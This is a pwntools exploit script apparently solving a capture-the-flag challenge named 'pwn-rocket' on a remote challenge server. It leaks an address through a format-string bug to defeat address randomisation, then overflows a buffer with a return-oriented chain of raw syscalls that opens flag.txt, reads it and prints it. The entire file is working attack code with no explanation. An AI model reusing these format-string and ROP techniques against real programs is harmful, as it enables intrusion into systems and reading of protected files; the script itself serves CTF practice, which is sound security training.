#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
HOST = "0.cloud.chals.io"
PORT = 13163
CHALL_BIN = "./pwn-rocket"
CHALL_LIBC = "/lib/i386-linux-gnu/libc.so.6"

context.log_level = "DEBUG"
gs = '''
b vuln
c
'''
context.binary = ELF(CHALL_BIN, checksec=False)
elf = context.binary
libc = ELF(CHALL_LIBC, checksec=False)

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return gdb.debug([elf.path], gdbscript=gs)

def exploit():
    payload = b"%15$p"
    io.sendline(payload)
    io.recvuntil("Welcome: ")
    leak = io.recvline()[0:-1]
    base = int(leak, 16) - (elf.symbols["main"]+24)
    print("elf base: ", hex(base))
    elf.address = base

    mov_rax_rsi = p64(base + 0x14e5)
    pop_rdx = p64(base + 0x14be)
    pop_rsi_r15 = p64(base + 0x1689)
    pop_rdi = p64(base + 0x168b)
    syscall_ret = p64(base + 0x14db)
    
    name = elf.bss() + 0x200
    buf = elf.bss() + 0x210
    

    padding = b'a'*0x48
    payload = padding + \
            pop_rsi_r15 + p64(0) + p64(0) + \
            mov_rax_rsi + \
            pop_rsi_r15 + p64(name) + p64(0) + \
            pop_rdx + p64(8) + \
            pop_rdi + p64(0) + \
            syscall_ret
            #read(0, name, 8)
    payload += pop_rsi_r15 + p64(2) + p64(0) + \
            mov_rax_rsi + \
            pop_rdi + p64(name) + \
            pop_rsi_r15 + p64(0) + p64(0) + \
            syscall_ret
            #open(name, RDONLY)
    payload += pop_rsi_r15 + p64(0) + p64(0) + \
            mov_rax_rsi + \
            pop_rsi_r15 + p64(buf) + p64(0) + \
            pop_rdx + p64(0x100) + \
            pop_rdi + p64(3) + \
            syscall_ret
            #read(3, buf, 0x100)
    payload += pop_rsi_r15 + p64(1) + p64(0) + \
            mov_rax_rsi + \
            pop_rsi_r15 + p64(buf) + p64(0) + \
            pop_rdx + p64(0x100) + \
            pop_rdi + p64(1) + \
            syscall_ret
            #write(1, buf, 0x100)

    io.sendline(payload)
    io.send(b"flag.txt")



io = start()
exploit()
io.interactive()
